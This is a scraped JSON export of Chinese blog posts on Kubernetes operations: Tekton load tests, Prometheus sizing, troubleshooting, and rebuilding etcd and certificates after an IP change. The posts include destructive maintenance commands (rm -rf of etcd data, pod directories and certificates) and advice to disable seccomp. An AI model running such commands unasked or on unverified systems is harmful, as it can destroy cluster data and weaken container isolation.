及其基础设施的性能，为了提高集群的并发量，特地使用低功耗的流水线。否则加上外部依赖，场景会十分复杂，也不利于实验的重现。 7. 测试结果 7.1 并发-执行时长对照 并发数量 触发/执行成功率 平均执行时长 最短/最长执行时长 Tekton Dashboard 组件压力情况 1 100%/100% 3m37s 3m24s~3m53s OK 无 50 100%/100% 4m20s 4m~5m7s OK 无 100 100%/100% 4m30s 4m15s~5m22s OK kube-apiserver 、prometheus 的压力显著增加 200 100%/100% 8m50s 7m55s~9m25s OK 平均时长显著增加 400 100%/100% 16m5s 12m11s~17m04s 不流畅 执行时间差异明显增加 800 100%/100% 35m26s 12m21s~42m21s 很卡 - 1600 100%/100% 50m12s 12m58s~85m59 打不开 - 7.2 Tekton 创建流水线速度 在以上集群参数下，1k 条流水线，需要约 200 秒全部创建完成，平均 5 条/秒的创建速度。\n8. 总结 虽然真正的任务只执行 3m，但单条流水线平均执行时间 3m37s，其中就有 37s 用于创建 Pod。可以通过减少 task，增加 step 减少 Pod 数量，节省流水线执行时间。\n并发时，流水线的执行完成顺序并不是触发的顺序。流水线执行每个 task 需要创建 Pod，导致流水线之间形成竞争，无法快速执行完成单个流水线中的全部 task。\n从 100 并发开始，并发量每增加一倍，平均执行时间增加一倍。200 并发时，执行时间翻倍是不能接受的。因此单个集群的并发应该控制在 100 以内。\n虽然数据只列到 1600，实际上测试到接近 1w 也能抗住，但流水线执行时间太长。原本只需要 3 m 执行完成的流水线，高并发下竟然需要几个小时，已经失去了实际意义。\n9. 参考 https://tekton.dev/vault/pipelines-v0.24.3/tekton-controller-performance-configuration/ ","description":"","id":133,"section":"post","tags":["Tekton","Kubernetes","大集群","调优","博文"],"title":"Tekton 压力测试及构建集群参数优化","uri":"https://www.chenshaowen.com/blog/tekton-stress-test-and-optimize-k8s-cluster.html"},{"content":"1. 本地存储容量 所需磁盘大小（GB） = 数据保留时长 * 每秒获取指标数量 * 指标数据大小 / 1024 / 1024 / 1024\n其中\n每秒获取指标数量 rate(prometheus_tsdb_head_samples_appended_total[1d]) 一个小时内样本的平均大小 rate(prometheus_tsdb_compaction_chunk_size_bytes_sum[1d])/rate(prometheus_tsdb_compaction_chunk_samples_sum[1d]) 一天（86400 秒）的磁盘消耗，可以在 Prometheus 中直接查询:\n86400 * (rate(prometheus_tsdb_head_samples_appended_total[1d]) * (rate(prometheus_tsdb_compaction_chunk_size_bytes_sum[1d]) / rate(prometheus_tsdb_compaction_chunk_samples_sum[1d]))) / 1024 /1024 / 1024 例如，返回 {instance=\u0026quot;localhost:9090\u0026quot;, job=\u0026quot;prometheus\u0026quot;} 4.437027408140867，那么表示 localhost:9090 实例每天需要消耗 4.437 GB 的存储空间。同时，在实例中，有不少于 3 个 wal 文件用于存储原始数据，每个 128 MB。\n2. 内存消耗 内存消耗 = Prometheus Server 自身的内存消耗 + 数据块 block 内存消耗 + 抓取指标的内存消耗 + 查询带来的内存消耗\nPrometheus Server 自身的内存消耗 在刚安装好的多节点高可用集群上，Prometheus Server 的内存消耗为 500 MB 左右。\n数据块 block 内存消耗 主要和以下参数相关\n- 每秒获取指标数量 rate(prometheus_tsdb_head_samples_appended_total[1d]) - 每个指标的平均标签数 - 不同的标签 Pair 总数 - 每个标签 Pair 平均大小 - 数据块 block 落盘周期 抓取指标的内存消耗 主要和以下参数相关\n- 每秒获取指标数量 rate(prometheus_tsdb_head_samples_appended_total[1d]) - 一个小时内样本的平均大小 - 采集间隔，通常是 15s 在页面 https://www.robustperception.io/how-much-ram-does-prometheus-2-x-need-for-cardinality-and-ingestion/ 可以估算上面两部分。\n查询带来的内存消耗 当查询的数据不在内存时，Prometheus 会加载硬盘数据到内存，会有额外的内存消耗。\n在生产中，通过 avg(container_memory_working_set_bytes{image!=\u0026quot;\u0026quot;, container=\u0026quot;prometheus-server\u0026quot;}) / 1024 /1024 查询的 40 多个集群的平均内存消耗在 953 MB，每个集群平均个 300 Pod。\n","description":"","id":134,"section":"post","tags":["博文","Prometheus"],"title":"如何估算 Prometheus 的本地存储和内存消耗","uri":"https://www.chenshaowen.com/blog/how-to-estimate-the-local-and-memory-storage-consumption-of-prometheus.html"},{"content":"设置合理的 Req 和 Limit 不设置 Req 和 Limit，当应用的 CPU、MEM 暴涨时，会危害同一节点上的其他 Pod，甚至导致集群节点一个接一个被压垮。\nReq 和 Limit 一共有四个值，如果只设置部分值，当节点资源使用率达到 Kubelet 预设值时，Kubelet 会驱逐 Pod，驱逐的顺序是 Guaranteed \u0026gt; Burstable \u0026gt; Best-Effort\n其中:\nGuaranteed, 全部容器设置 CPU、MEM 的请求和限制，同时相等 Burstable, 至少一个容器具有 CPU、MEM 的请求或限制 BestEffort, 容器都没有设置 CPU、MEM 的请求或限制 Req 与 Limit 不应该相差太大，通常 Limit = Req * 1.5 或者根据监控历史进行设置。资源消耗越多的 Pod，Req 和 Limit 应该越相近。\n关注应用的 CPU 限流 由于 CPU 是可压缩的资源，在设置了 Limit 之后，即使高负载，应用通常也是可用的。但是会很慢。\n这是由于系统对 CPU 的分配是分片的，在一个周期内，如果应用对 CPU 分片的使用达到 Limit 限制，那么应用需要等待下一个周期才能获得 CPU 使用机会。此时，应用处于 CPU 限流状态。\nCPU 限流会导致，应用的响应变慢。\n需要注意的是不仅仅是 Pod 的 CPU 使用达到 Limit 限制，如果节点的 CPU 负载高，同样也会存在 CPU 限流，应用能使用的资源是除去节点自身消耗的部分。\n使用伸缩重启 Prometheus 不要滚动重启，滚动重启会导致，短时间内组件资源消耗加倍，影响集群稳定性。\n1 2 kubectl scale deployment prom-prometheus-server --replicas=0 kubectl scale deployment prom-prometheus-server --replicas=1 同时，默认没有开启 --storage.tsdb.no-lockfile 参数下的 Prometheus 无法滚动重启，也只能使用上述方法重启。\n否则报错，opening storage failed: lock DB directory: resource temporarily unavailable。\n一个存储卷，多个 Prometheus 可能会导致脏数据。\n运行容器时，exec user process caused: no such file or directory 有两种情况:\n基础镜像是 alpine:latest，换其他镜像试试 ENTRYPOINT 脚本的编码问题，修改 Windows 下的 CRLF 为 Linux 下的 LF 应用 OOMKilled Exit Code: 137 有两种情况:\n容器内存使用量超过 limit 值 节点内存不足 应用 getting the final child\u0026rsquo;s pid from pipe caused \u0026quot;EOF\u0026quot;: unknown 内核版本为 3.x， 需要升级到 5.x 。\n应用内存出现突刺 现象:\n应用瞬时内存使用量暴涨，然后又恢复正常。有可能会伴随 OOMKilled。\n原因:\nfor 循环拼接字符串导致的内存暴涨。\n解决方案:\n使用 strings.Builder 代替 + 拼接字符串\n应用被驱逐，EmptyDir volume exceeds the limit 现象:\n应用状态 Failed，被 Kubelet 驱逐，报错 Usage of EmptyDir volume \u0026ldquo;tmp\u0026rdquo; exceeds the limit \u0026ldquo;50Gi\u0026rdquo; 。\n原因:\nKubelet 默认限制 Pod 临时存储能使用磁盘大小的 10%，inodes 的 5%。一旦超过限制，Kubelet 会驱逐 Pod。\n解决方案:\n1 2 3 4 5 resources: limits: ephemeral-storage: 100Gi requests: ephemeral-storage: 100Gi 可以通过 ephemeral-storage 指定临时存储的大小。\n","description":"","id":135,"section":"post","tags":["博文","Kubernetes"],"title":"Kubernetes 应用 troubleshooting","uri":"https://www.chenshaowen.com/blog/kubernetes-app-troubleshooting.html"},{"content":"FailedCreatePodSandBox 错误 Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: process_linux.go:402: getting the final child's pid from pipe caused: EOF: unknown\n处理 清理 cache\n1 echo 3 \u0026gt; /proc/sys/vm/drop_caches 原因 内存碎片过多\ncalico-node 不停重启 increase max user 错误 runtime: failed to create new OS thread (have 11 already; errno=11)，runtime: may need to increase max user processes (ulimit -u)\n处理 增加 ulimit 限制额度\n1 ulimit -u unlimited 原因 用户进程数耗尽\ncalico-node BIRD is not ready 错误 Readiness probe failed: calico/node is not ready: BIRD is not ready: Error querying BIRD: unable to connect to BIRDv4 socket: dial unix /var/run/calico/bird.ctl: connect: connection refused\n处理 执行 ifconfig 找到当前主机 IP 绑定的网卡，例如 ens192。\nkubectl -n kube-system edit ds calico-node\n将\n1 2 - name: IP_AUTODETECTION_METHOD value: can-reach=$(NODEIP) 改为\n1 2 - name: IP_AUTODETECTION_METHOD value: \u0026#34;interface=ens192\u0026#34; 使得 interface 值能正则匹配上 ens192 即可。\n原因 Calico 没有自动识别到正确的网卡。\ncgroup 内存泄露问题 cannot allocate memory 错误 mkdir /sys/fs/cgroup/memory/kubepods/burstable/pod7a1e89bd-b85e-46c6-9674-bbfd3ead02d1: cannot allocate memory\n如果有 fork 相关字样，可能是 PID 耗尽。\n临时处理 清理 cache\n1 echo 3 \u0026gt; /proc/sys/vm/drop_caches 永久处理 修改 /etc/default/grub GRUB_CMDLINE_LINUX 加上了 cgroup.memory=nokmem\n生成配置 /usr/sbin/grub2-mkconfig -o /boot/grub2/grub.cfg\n重启机器 reboot\n原因 cgroup 内存泄露\nkubectl 404 page not found 错误 执行 kubectl exec 时，报错 error: unable to upgrade connection: 404 page not found\n处理 在 kubelet 启动参数中添加当前节点的 IP，Environment=\u0026quot;KUBELET_EXTRA_ARGS=--node-ip=x.x.x.x\u0026quot;\n原因 安装工具未能准确识别主机 IP\n容器内系统调用出错、没权限 错误 Problem executing scripts Post-Invoke Sub-process returned an error code 没权限提示\n处理 在运行时，添加参数 --security-opt seccomp=unconfined 禁用 seccomp\n原因 内核中的 Seccomp 安全模块，限制了容器对主机的系统调用能力。\nNodePort 服务不能通过 localhost 访问 错误 NodePort 暴露的服务，不能通过 localhost:port 访问，只能通过主机的 ip:port 访问。\n处理 检测回环转发参数\n1 sysctl net.ipv4.conf.all.route_localnet 临时生效\n1 sysctl -w net.ipv4.conf.all.route_localnet=1 永久生效\n1 echo \u0026#34;net.ipv4.conf.all.route_localnet=1\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf \u0026amp;\u0026amp; sysctl -p 原因 ipvs 模式默认关闭了该转发路径\n创建 Pod 失败 fork/exec /usr/bin/runc 错误 1 OCI runtime create failed: unable to retrieve OCI runtime error (open /run/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/488165d6dd80c997d252ac1a5f36f41edc567cc828d98c0c0b8f1c2acf2e2524/log.json: no such file or directory): 处理 查看 PID 限制\n1 cat /proc/sys/kernel/pid_max 查看当前用户使用\n1 ps -eLf | wc -l 永久调大 PID 限制\necho \u0026#34;kernel.pid_max=65535 \u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf \u0026amp;\u0026amp; sysctl -p kubelet volume subpaths are still present on disk 错误 kubelet 大量错误日志\n1 Jan 29 01:37:40 k8s-node-2510 kubelet[2080]: E0129 01:37:40.567812 2080 kubelet_volumes.go:154] orphaned pod \u0026#34;1683eaf9-1b46-4ea1-99e5-337bc9c2232c\u0026#34; found, but volume subpaths are still present on disk : There were a total of 14 errors similar to this. Turn up verbosity to see them. 原因 使用 --force --grace-period=0 强制删除 Pod 时，资源没有被回收。\n处理 在 /var/lib/kubelet/pods/ 找到相关 Pod 信息，确认 Pod 已经停止之后，删除 Pod 的目录。\n查看 Pod 名字\n1 2 3 4 5 6 7 cat /var/lib/kubelet/pods/1683eaf9-1b46-4ea1-99e5-337bc9c2232c/etc-hosts # Kubernetes-managed hosts file. 127.0.0.1\tlocalhost ::1\tlocalhost ip6-localhost ip6-loopback 10.233.73.154\tfmovedaemon-b9c68cd45-qm2wr fmovedaemon-b9c68cd45-qm2wr 即为 Pod 名字，确认 Pod 停止后，直接删除目录即可。\n1 rm -rf /var/lib/kubelet/pods/1683eaf9-1b46-4ea1-99e5-337bc9c2232c/ kubelet MountVolume failed 错误 1 2 3 kubelet MountVolume.MountDevice failed for volume \u0026#34;pvc-4c79c2aa-3a55-4dde-92f2-636b30ea8921\u0026#34; : rpc error: code = Internal desc = format of disk \u0026#34;/dev/longhorn/pvc-4c79c2aa-3a55-4dde-92f2-636b30ea8921\u0026#34; failed: type:(\u0026#34;ext4\u0026#34;) target:(\u0026#34;/var/lib/kubelet/plugins/kubernetes.io/csi/pv/pvc-4c79c2aa-3a55-4dde-92f2-636b30ea8921/globalmount\u0026#34;) options:(\u0026#34;defaults\u0026#34;) errcode:(exit status 1) output:(mke2fs 1.46.4 (18-Aug-2021) /dev/longhorn/pvc-4c79c2aa-3a55-4dde-92f2-636b30ea8921 is apparently in use by the system; will not make a filesystem here! ) 处理 编辑多路径文件\n1 vim /etc/multipath.conf 新增如下内容:\n1 2 3 blacklist { devnode \u0026#34;^sd[a-z0-9]+\u0026#34; } 重启服务\n1 systemctl restart multipathd.service 原因 多路径为任何符合条件的设备路径创建了多路径设备，包括 Longhorn 存储卷设备，导致 Kubelet 挂载错误。\n大内存 Pod 启动失败 page allocation failure 错误 1 starting container process caused \\\u0026#34;process_linux.go:245: running exec setns process for init caused \\\\\\\u0026#34;exit status 6 处理 1 echo 3 \u0026gt; /proc/sys/vm/drop_caches 原因 系统内存碎片化，导致创建系统 namespace 时没有足够的大页内存。可以通过一下命令查看内存使用，如果 0 较多说明内存碎片化严重:\n1 cat /proc/buddyinfo 使用 IPVS 模式下，服务 No route to host 错误 No route to host 原因 当有大量短连接时，很多链接处于 TIME_WAIT 状态，内核会重用这些链接端口。\n内核参数 net.ipv4.vs.conn_reuse_mode 设置为 0 ，重用端口时，IPVS 将流量直接转发至之前的 RS，绕过负载均衡，部分流量被转发到销毁的 Pod 上，导致 No route to host。\n处理 在内核 5.9 版本之前建议使用 iptables 模式。\n但 iptables 模式下，当集群的服务数量超过 2000 之后，变更规则、转发效率会开始明显下降，CPU 使用率会上升。\n在内核 5.9 版本之后建议使用 IPVS 模式。\nnet.ipv4.vs.conn_reuse_mode设为 1，强制复用连接走负载均衡 net.ipv4.vs.conntrack 设为 0，防止 IPVS 对复用连接进行 DROP SYNC 操作 集群 kube-apiserver P99 解决 20s 错误 处理 删除掉已经停机的、状态为 NotReady 的节点。\n原因 可能的原因是，集群中有节点已经停机，但是没有从集群中被剔除。导致某处经过 kube-apiserver 的请求，需要等待超时，超时时间为 20s。\n具体原因还需要进一步验证，但删除已经停机的节点后，kube-apiserver P99 能恢复正常。\nPod 创建慢 错误 Sep 11 08:23:17 node3 kubelet[1437]: E0911 08:23:17.770706 1437 kubelet_volumes.go:225] \u0026#34;There were many similar errors. Turn up verbosity to see them.\u0026#34; err=\u0026#34;orphaned pod \\\u0026#34;10ff3c51-ebf2-47dd-b837-fd584319a754\\\u0026#34; found, but error not a directory occurred when trying to remove the volumes dir\u0026#34; numErrs=10 原因 可能的原因之一是，创建 Pod 依赖 Secret、ConfigMap 等资源，但在当前命名空间下，这些资源不存在，导致 Kubelet 一直尝试去获取这些资源，直到超时，影响了 Pod 的创建。\n处理 找到缺失的资源，创建之。\n创建调试的 Pod 创建 DaemonSet 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: apps/v1 kind: DaemonSet metadata: name: demo-ubuntu-daemonset namespace: default spec: selector: matchLabels: app: demo-ubuntu-daemonset template: metadata: labels: app: demo-ubuntu-daemonset spec: containers: - name: ubuntu image: registry.cn-beijing.aliyuncs.com/shaowenchen/demo-ubuntu EOF 指定节点创建 Deployment 1 export NODE_NAME=MyHostName 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: apps/v1 kind: Deployment metadata: name: demo-ubuntu-deploy namespace: default spec: replicas: 1 selector: matchLabels: app: demo-ubuntu-deploy template: metadata: labels: app: demo-ubuntu-deploy spec: nodeName: $NODE_NAME containers: - name: demo-ubuntu image: registry.cn-beijing.aliyuncs.com/shaowenchen/demo-ubuntu EOF ","description":"","id":136,"section":"post","tags":["博客","Kubernetes"],"title":"Kubernetes 集群 troubleshooting","uri":"https://www.chenshaowen.com/blog/kubernetes-cluster-troubleshooting.html"},{"content":" 记录一次因为 IP 变更导致集群故障的修复过程。有两个集群，一个是单节点(allinone)，另一个是四节点(3 master 1 node)的集群。\n1. 更新 Etcd 证书 【在每个 Etcd 节点】备份 Etcd 证书 1 cp -R /etc/ssl/etcd/ssl /etc/ssl/etcd/ssl-bak 查看 Etcd 证书中的域 1 2 3 openssl x509 -in /etc/ssl/etcd/ssl/node-node1.pem -noout -text|grep DNS DNS:etcd, DNS:etcd.kube-system, DNS:etcd.kube-system.svc, DNS:etcd.kube-system.svc.cluster.local, DNS:localhost, DNS:node1, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1, IP Address:x.x.x.1 需要记录下全部的 DNS、IP 值，用于生成新的证书。\n【在每个 Etcd 节点】清理旧的 Etcd 证书 1 rm -f /etc/ssl/etcd/ssl/* 【在一个 Etcd 节点】生成 Etcd 证书配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 vim /etc/ssl/etcd/ssl/openssl.conf [req] req_extensions = v3_req distinguished_name = req_distinguished_name [req_distinguished_name] [ v3_req ] basicConstraints = CA:FALSE keyUsage = nonRepudiation, digitalSignature, keyEncipherment subjectAltName = @alt_names [ ssl_client ] extendedKeyUsage = clientAuth, serverAuth basicConstraints = CA:FALSE subjectKeyIdentifier=hash authorityKeyIdentifier=keyid,issuer subjectAltName = @alt_names [ v3_ca ] basicConstraints = CA:TRUE keyUsage = nonRepudiation, digitalSignature, keyEncipherment subjectAltName = @alt_names authorityKeyIdentifier=keyid:always,issuer [alt_names] DNS.1 = localhost DNS.2 = etcd.kube-system.svc.cluster.local DNS.3 = etcd.kube-system.svc DNS.4 = etcd.kube-system DNS.5 = etcd DNS.6 = xxx IP.1 = 127.0.0.1 IP.2 = x.x.x.x 需要包含所有部署 Etcd 节点的主机名和 IP 地址。\n【在一个 Etcd 节点】生成 Etcd 的 CA 证书 1 2 3 cd /etc/ssl/etcd/ssl openssl genrsa -out ca-key.pem 2048 openssl req -x509 -new -nodes -key ca-key.pem -days 3650 -out ca.pem -subj \u0026#34;/CN=etcd-ca\u0026#34; 【在一个 Etcd 节点】给每个节点生成 Etcd 的 Admin 证书 通过 export host=node1 设置不同环境变量，给每一个节点生成证书。这里的 node1 是主机名，保持与之前一致，避免因改名找不到证书。\n1 2 3 openssl genrsa -out admin-${host}-key.pem 2048 openssl req -new -key admin-${host}-key.pem -out admin-${host}.csr -subj \u0026#34;/CN=etcd-admin-${host}\u0026#34; openssl x509 -req -in admin-${host}.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out admin-${host}.pem -days 3650 -extensions ssl_client -extfile openssl.conf 【在一个 Etcd 节点】给每个节点生成 Etcd 的 Member 证书 通过 export host=node1 切换节点，给每一个节点生成证书。\n1 2 3 openssl genrsa -out member-${host}-key.pem 2048 openssl req -new -key member-${host}-key.pem -out member-${host}.csr -subj \u0026#34;/CN=etcd-member-${host}\u0026#34; -config openssl.conf openssl x509 -req -in member-${host}.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out member-${host}.pem -days 3650 -extensions ssl_client -extfile openssl.conf 【在一个 Etcd 节点】给每个节点生成 Etcd 的 Node 证书 通过 export host=node1 切换节点，给每一个节点生成证书。\n1 2 3 openssl genrsa -out node-${host}-key.pem 2048 openssl req -new -key node-${host}-key.pem -out node-${host}.csr -subj \u0026#34;/CN=etcd-node-${host}\u0026#34; openssl x509 -req -in node-${host}.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out node-${host}.pem -days 3650 -extensions ssl_client -extfile openssl.conf 【在一个 Etcd 节点】分发生成的证书 需要将 /etc/ssl/etcd/ssl/ 下的证书，分发到各个 Etcd 节点上。\n【在一个 Etcd 节点】查看 etcd 配置 这里 Etcd 是以二进制启动的，在 systemd 中可以找到 etcd 配置文件的存放位置。\n1 2 3 4 cat /etc/systemd/system/etcd.service ... EnvironmentFile=/etc/etcd.env 【每个 Etcd 节点】替换 IP 由于有多个 Etcd 节点，因此需要替换多组 IP，这里以三节点为例。\n1 2 3 4 5 6 7 8 export oldip1=x.x.x.1 export newip1=x.x.10.1 export oldip2=x.x.x.2 export newip2=x.x.10.2 export oldip3=x.x.x.3 export newip3=x.x.10.3 1 2 3 sed -i \u0026#34;s/$oldip1/$newip1/\u0026#34; /etc/etcd.env sed -i \u0026#34;s/$oldip2/$newip2/\u0026#34; /etc/etcd.env sed -i \u0026#34;s/$oldip3/$newip3/\u0026#34; /etc/etcd.env /etc/hosts 也需要替换 IP，因为有时配置文件中使用的是主机名。\n1 2 3 sed -i \u0026#34;s/$oldip1/$newip1/\u0026#34; /etc/hosts sed -i \u0026#34;s/$oldip2/$newip2/\u0026#34; /etc/hosts sed -i \u0026#34;s/$oldip3/$newip3/\u0026#34; /etc/hosts 如果有定时备份任务，也需要替换下相关 IP。\n1 2 3 sed -i \u0026#34;s/$oldip1/$newip1/\u0026#34; /usr/local/bin/kube-scripts/etcd-backup.sh sed -i \u0026#34;s/$oldip2/$newip2/\u0026#34; /usr/local/bin/kube-scripts/etcd-backup.sh sed -i \u0026#34;s/$oldip3/$newip3/\u0026#34; /usr/local/bin/kube-scripts/etcd-backup.sh 【每个 Etcd 节点】从备份中恢复 Etcd 数据 如果是单节点的 Etcd 可以跳过此步骤。由于节点 IP 发生变化，Etcd 集群已经无法运行。多节点 Etcd 需要使用备份数据才能够恢复，这是因为 Etcd 的节点信息被存在磁盘数据中，仅修改配置文件并没有用。\n将 Etcd 备份文件 snapshot.db 分发到每个 Etcd 节点上。\n在每个节点上执行如下命令:\n1 rm -rf /var/lib/etcd 1 2 3 4 5 etcdctl snapshot restore snapshot.db --name etcd-node1 \\ --initial-cluster \u0026#34;etcd-node1=https://x.x.10.1:2380,etcd-node2=https://x.x.10.2:2380,etcd-node3=https://x.x.10.3:2380\u0026#34; \\ --initial-cluster-token k8s_etcd \\ --initial-advertise-peer-urls https://x.x.10.1:2380 \\ --data-dir=/var/lib/etcd 需要注意，每个节点上的 etcd-node1 名字, --initial-advertise-peer-urls 参数会有差异。\n【每个 Etcd 节点】重启 etcd 1 systemctl restart etcd 【每个 Etcd 节点】查看 etcd 状态 1 systemctl status etcd 2. 更新 K8s 证书 备份证书 1 cp -R /etc/kubernetes/ /etc/kubernetes-bak 【每个 Kubernetes 节点】替换相关文件中的 IP 地址 1 2 3 4 5 6 7 8 9 10 11 12 13 # master 节点 export oldip1=x.x.x.1 export newip1=x.x.10.1 export oldip2=x.x.x.2 export newip2=x.x.10.2 export oldip3=x.x.x.3 export newip3=x.x.10.3 # node 节点 export oldip4=x.x.x.4 export newip4=x.x.10.4 1 2 3 4 find /etc/kubernetes -type f | xargs sed -i \u0026#34;s/$oldip1/$newip1/\u0026#34; find /etc/kubernetes -type f | xargs sed -i \u0026#34;s/$oldip2/$newip2/\u0026#34; find /etc/kubernetes -type f | xargs sed -i \u0026#34;s/$oldip3/$newip3/\u0026#34; find /etc/kubernetes -type f | xargs sed -i \u0026#34;s/$oldip4/$newip4/\u0026#34; 1 2 3 4 sed -i \u0026#34;s/$oldip1/$newip1/\u0026#34; /etc/systemd/system/kubelet.service.d/10-kubeadm.conf sed -i \u0026#34;s/$oldip2/$newip2/\u0026#34; /etc/systemd/system/kubelet.service.d/10-kubeadm.conf sed -i \u0026#34;s/$oldip3/$newip3/\u0026#34; /etc/systemd/system/kubelet.service.d/10-kubeadm.conf sed -i \u0026#34;s/$oldip4/$newip4/\u0026#34; /etc/systemd/system/kubelet.service.d/10-kubeadm.conf 1 2 3 4 sed -i \u0026#34;s/$oldip1/$newip1/\u0026#34; /etc/kubernetes/kubeadm-config.yaml sed -i \u0026#34;s/$oldip2/$newip2/\u0026#34; /etc/kubernetes/kubeadm-config.yaml sed -i \u0026#34;s/$oldip3/$newip3/\u0026#34; /etc/kubernetes/kubeadm-config.yaml sed -i \u0026#34;s/$oldip4/$newip4/\u0026#34; /etc/kubernetes/kubeadm-config.yaml 1 2 3 4 sed -i \u0026#34;s/$oldip1/$newip1/\u0026#34; /etc/hosts sed -i \u0026#34;s/$oldip2/$newip2/\u0026#34; /etc/hosts sed -i \u0026#34;s/$oldip3/$newip3/\u0026#34; /etc/hosts sed -i \u0026#34;s/$oldip4/$newip4/\u0026#34; /etc/hosts 【在一个 master 节点】生成证书 1 rm -f /etc/kubernetes/pki/apiserver* 1 kubeadm init phase certs all --config /etc/kubernetes/kubeadm-config.yaml 【每个 Kubernetes 节点】将生成的证书分发到节点上 node 节点不需要 key，只需要 crt。\n3. 更新集群组件的 Conf 文件 【在一个 master 节点】生成新的配置文件 1 2 cd /etc/kubernetes rm -f admin.conf kubelet.conf controller-manager.conf scheduler.conf 1 kubeadm init phase kubeconfig all --config /etc/kubernetes/kubeadm-config.yaml 【每个 Kubernetes 节点】将新的配置文件分发到每个节点 每个节点都需要 /etc/kubernetes/kubelet.conf，每个 master 节点都需要 /etc/kubernetes/controller-manager.conf、/etc/kubernetes/scheduler.conf。\n【在需要使用 kubectl 的节点】 配置用户访问凭证 1 2 cp /etc/kubernetes/admin.conf $HOME/.kube/config 【每个 Kubernetes 节点】重启 kubelet 1 2 systemctl daemon-reload systemctl restart kubelet 【每个 Kubernetes 节点】查看 kubelet 状态 1 systemctl status kubelet 4. 修复 ConfigMap 替换 IP 1 kubectl -n kube-system edit cm kube-proxy kube-proxy 会影响节点通信。如果使用的 LB 或者域名作为 Apiserver 入口，也可以不进行替换。至于 kubeadm-config ，在上面步骤中已经自动替换，因此也不需要额外处理。\n5. 总结 强烈建议，不要修改集群主机的 IP 地址。如果是预期内的主机 IP 变更，可以通过备份-恢复的方式重建集群。\n如果是非预期的主机 IP 变更，建议按照上述顺序进行修复:\nEtcd K8s 证书 K8s Master 节点、Node 节点核心组件 集群 ConfigMap 配置 上述内容虽然记录了修复过程。但多 master 节点修复时，现场很复杂。容器在不断重启，期间还一直报错端口冲突，为此我还重启了一次机器。修复过程记录可能有不完善的地方，但是只需要按照顺序，一个组件一个组件修复应该问题不大。\n","description":"","id":137,"section":"post","tags":["博文","Kubernetes","运维","修复"],"title":"如何修复变更 IP 之后的 Kubernetes 集群","uri":"https://www.chenshaowen.com/blog/how-to-repair-the-kubernetes-cluster-after-changing-ip.html"},{"content":" 本文翻译自 https://learnk8s.io/kubernetes-network-packets，并没有逐字翻译，带入了些自己的理解。\n阅读本文，你可以了解在 Kubernetes 内外，数据包是如何转发的，从原始的 Web 请求开始，到托管应用程序的容器。\nKubernetes 网络要求 在深入了解在 Kubernetes 集群中数据包如何流转的细节之前，先明确一下 Kubernetes 对网络的要求。\nKubernetes 网络模型定义了一组基本规则：\n在不使用网络地址转换 (NAT) 的情况下，集群中的 Pod 能够与任意其他 Pod 进行通信。 在不使用网络地址转换 (NAT) 的情况下，在集群节点上运行的程序能与同一节点上的任何 Pod 进行通信。 每个 Pod 都有自己的 IP 地址（IP-per-Pod），并且任意其他 Pod 都可以通过相同的这个地址访问它。 这些要求，不会将具体实现限制在某种解决方案上。\n相反，它们笼统地描述了集群网络的特性。\n为了满足这些限制，你必须解决以下挑战:\n如何确保同一个 Pod 中的容器行为就像它们在同一个主机上一样？ 集群中的 Pod 能否访问其他 Pod？ Pod 可以访问服务吗？服务是负载均衡的吗？ Pod 可以接收集群外部的流量吗？ 在本文中，将重点关注前三点，从 Pod 内的网络，容器到容器的通信说起。\nLinux 网络命名空间如何在 Pod 中工作 让我们来看一个运行应用的主容器和伴随一起的另一个容器。\n在示例中，有一个带有 nginx 和 busybox 容器的 Pod:\n1 2 3 4 5 6 7 8 9 10 11 apiVersion: v1 kind: Pod metadata: name: multi-container-Pod spec: containers: - name: container-1 image: busybox command: [\u0026#39;/bin/sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;sleep 1d\u0026#39;] - name: container-2 image: nginx 部署时，会发生以下事情：\nPod 在节点上拥有独立的网络命名空间。 分配一个 IP 地址给 Pod ，两个容器之间共享端口。 两个容器共享相同的网络命名空间，并在本地彼此可见。 网络配置在后台迅速完成。\n但是，让我们退后一步，尝试理解为什么运行容器需要上述动作。\n在 Linux 中，网络命名空间是独立的、隔离的逻辑空间。\n你可以将网络命名空间视为，将物理网络接口分割小块之后的独立部分。\n每个部分都可以单独配置，并拥有自己的网络规则和资源。\n这些包括防火墙规则、接口（虚拟的或物理的）、路由以及与网络相关的所有内容。\n物理网络接口持有根网络命名空间。 你可以使用 Linux 网络命名空间来创建独立的网络。每个网络都是独立的，除非你进行配置，默认不会与其他网络互通。 但最终，还是需要物理接口处理所有真实的数据包，所有虚拟接口都是基于物理接口创建的。\n网络命名空间可以通过 ip-netns 进行管理，使用 ip netns list 可以列出主机上的命名空间。\n需要注意的是，创建的网络命名空间会出现在 /var/run/netns 下面，但 Docker 并没有遵循这一规则。\n例如，这是 Kubernetes 节点的一些命名空间：\n1 2 3 4 5 6 7 ip netns list cni-0f226515-e28b-df13-9f16-dd79456825ac (id: 3) cni-4e4dfaac-89a6-2034-6098-dd8b2ee51dcd (id: 4) cni-7e94f0cc-9ee8-6a46-178a-55c73ce58f2e (id: 2) cni-7619c818-5b66-5d45-91c1-1c516f559291 (id: 1) cni-3004ec2c-9ac2-2928-b556-82c7fb37a4d8 (id: 0) 注意 cni- 前缀；这意味着命名空间是由 CNI 插件创建的。\n当你创建一个 Pod，Pod 被分配给一个节点后，CNI 将：\n分配 IP 地址。 将容器连接到网络。 如果 Pod 包含多个容器，那么这些容器都将被放在同一个命名空间中。\n当创建 Pod 时，容器运行时会给容器创建一个网络命名空间。 然后 CNI 负责给 Pod 分配一个 IP 地址。 最后 CNI 将容器连接到网络的其余部分。 那么，当你列出节点上的容器的命名空间会发生什么呢？\n你可以通过 SSH 连接到 Kubernetes 节点并查看命名空间：\n1 2 3 4 5 6 lsns -t net NS TYPE 